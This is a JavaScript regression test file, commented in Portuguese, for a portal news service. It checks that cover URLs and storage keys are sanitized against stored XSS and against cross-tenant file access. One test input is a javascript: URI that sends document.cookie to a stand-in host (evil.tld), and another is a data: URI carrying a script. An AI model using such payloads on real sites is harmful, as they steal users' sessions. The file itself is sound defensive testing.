const test = require('node:test');
const assert = require('node:assert/strict');

require('../../test/ensure-test-env');

// Regressão: coverUrl/coverStorageKey eram gravados crus no banco, sem validar o
// esquema. Um staff do escritório podia gravar uma URI javascript: como capa de
// notícia; quando o CLIENTE abria o link da capa no portal, o script corria na
// sessão dele — stored XSS a atravessar a fronteira Firm -> Client.

function stubModule(relativePath, exports) {
  const resolved = require.resolve(relativePath, { paths: [__dirname] });
  require.cache[resolved] = { id: resolved, filename: resolved, loaded: true, exports };
  return resolved;
}

function createFakeSupabase(tables) {
  let autoId = 1;
  return {
    from(tableName) {
      const rows = tables[tableName] || (tables[tableName] = []);
      const filters = [];
      let pendingInsert = null;
      let pendingUpdate = null;

      const matches = () => rows.filter((r) => filters.every(([f, v]) => r[f] === v));

      const builder = {
        select() {
          return builder;
        },
        insert(payload) {
          const row = { id: `gen-${autoId++}`, ...payload };
          rows.push(row);
          pendingInsert = row;
          return builder;
        },
        update(patch) {
          pendingUpdate = patch;
          return builder;
        },
        eq(field, value) {
          filters.push([field, value]);
          return builder;
        },
        async single() {
          if (pendingInsert) return { data: pendingInsert, error: null };
          if (pendingUpdate) {
            const affected = matches();
            affected.forEach((r) => Object.assign(r, pendingUpdate));
            return { data: affected[0] || null, error: null };
          }
          return { data: matches()[0] || null, error: null };
        },
        async maybeSingle() {
          return builder.single();
        },
      };
      return builder;
    },
  };
}

function setup(tables) {
  const fakeSb = createFakeSupabase(tables);
  stubModule('../../db/supabase/client', {
    getSupabaseAdmin: () => fakeSb,
    isSupabaseConfigured: () => true,
  });
  delete require.cache[require.resolve('./news.service')];
  return require('./news.service');
}

test('createArticle: rejeita coverUrl com esquema javascript: em vez de gravar cru (stored XSS)', async () => {
  const tables = { news_articles: [] };
  const { createArticle } = setup(tables);

  await createArticle({
    firmId: 'firm-x',
    authorId: 'staff-1',
    authorName: 'Staff',
    payload: {
      title: 'Notícia',
      body: 'Corpo',
      coverUrl: "javascript:fetch('//evil.tld/x?c='+document.cookie)",
    },
  });

  assert.equal(tables.news_articles[0].cover_url, null, 'URI javascript: nunca deve chegar ao INSERT');
});

test('createArticle: preserva storage key própria (firm/...) e URL https legítima em coverUrl', async () => {
  const tables = { news_articles: [] };
  const { createArticle } = setup(tables);

  await createArticle({
    firmId: 'firm-x',
    authorId: 'staff-1',
    authorName: 'Staff',
    payload: { title: 'A', body: 'Corpo', coverUrl: 'firm/firm-x/news/cover.png' },
  });
  await createArticle({
    firmId: 'firm-x',
    authorId: 'staff-1',
    authorName: 'Staff',
    payload: { title: 'B', body: 'Corpo', coverUrl: 'https://cdn.teglion.com/cover.png' },
  });

  assert.deepEqual(
    tables.news_articles.map((r) => r.cover_url),
    ['firm/firm-x/news/cover.png', 'https://cdn.teglion.com/cover.png'],
  );
});

test('updateArticle: rejeita coverUrl com esquema data: no PATCH, não só no create', async () => {
  const tables = {
    news_articles: [{ id: 'art-1', firm_id: 'firm-x', title: 'Existente', cover_url: 'https://cdn.teglion.com/old.png' }],
  };
  const { updateArticle } = setup(tables);

  await updateArticle({
    firmId: 'firm-x',
    id: 'art-1',
    payload: { coverUrl: 'data:text/html,<script>alert(1)</script>' },
  });

  assert.equal(tables.news_articles[0].cover_url, null);
});

// Regressão (segunda auditoria): sanitizeCoverRefForStorage aceitava QUALQUER
// storage key com prefixo "firm/", sem confirmar que pertence à própria firm que
// está a gravar. Como createSignedDownloadUrl usa service_role (ignora RLS), um
// utilizador da Firm B podia apontar coverStorageKey para "firm/<firm-A>/..." e
// receber uma signed URL para um ficheiro de OUTRA firm — IDOR cross-tenant.
test('createArticle: rejeita coverStorageKey que aponta para o storage de OUTRA firm', async () => {
  const tables = { news_articles: [] };
  const { createArticle } = setup(tables);

  await createArticle({
    firmId: 'firm-b',
    authorId: 'staff-1',
    authorName: 'Staff',
    payload: { title: 'Notícia', body: 'Corpo', coverStorageKey: 'firm/firm-a/news/covers/segredo.png' },
  });

  assert.equal(tables.news_articles[0].cover_url, null, 'storage key de outra firm nunca deve ser aceite');
});

test('createArticle: aceita coverStorageKey que pertence à própria firm', async () => {
  const tables = { news_articles: [] };
  const { createArticle } = setup(tables);

  await createArticle({
    firmId: 'firm-a',
    authorId: 'staff-1',
    authorName: 'Staff',
    payload: { title: 'Notícia', body: 'Corpo', coverStorageKey: 'firm/firm-a/news/covers/capa.png' },
  });

  assert.equal(tables.news_articles[0].cover_url, 'firm/firm-a/news/covers/capa.png');
});
